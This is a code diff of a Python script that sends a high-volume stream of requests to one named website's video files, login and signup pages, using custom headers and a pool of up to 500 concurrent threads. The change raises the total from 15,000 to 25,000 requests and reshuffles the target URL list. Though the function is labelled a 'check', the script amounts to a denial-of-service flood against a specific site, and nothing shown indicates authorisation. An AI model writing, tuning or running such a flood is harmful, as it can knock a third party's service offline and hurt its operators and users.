@@ -9,18 +9,13 @@ image_urls = [
     "https://www.moctale.in/media/screen-recordings/2.mp4",
     "https://www.moctale.in/media/screen-recordings/3.mp4",
     "https://www.moctale.in/media/screen-recordings/4.mp4",
-    "https://www.moctale.in/manifest.json",
     "https://www.moctale.in/login?_rsc=p37cr",
-    "https://www.moctale.in/media/screen-recordings/1.mp4",
-    "https://www.moctale.in/media/screen-recordings/2.mp4",
-    "https://www.moctale.in/media/screen-recordings/3.mp4",
-    "https://www.moctale.in/media/screen-recordings/4.mp4",
     "https://www.moctale.in/signup?_rsc=1r34m",
+    "https://www.moctale.in/signup?_rsc=p37cr",
     "https://www.moctale.in/media/screen-recordings/1.mp4",
     "https://www.moctale.in/media/screen-recordings/2.mp4",
     "https://www.moctale.in/media/screen-recordings/3.mp4",
-    "https://www.moctale.in/media/screen-recordings/4.mp4",
-    "https://www.moctale.in/signup?_rsc=p37cr",
+    "https://www.moctale.in/media/screen-recordings/4.mp4"
 ]
 headers = {
     "Host": "www.moctale.in",
@@ -49,7 +44,7 @@ def fetch_url(request_id):
     except requests.exceptions.RequestException as e:
         return f"[{request_id}] Error for {target_url}: {e}"
 def run_multithreaded_check():
-    total_requests = 15000
+    total_requests = 25000
     max_workers = 500
 
     print(f"Starting execution: {total_requests} requests with up to {max_workers} concurrent threads...")
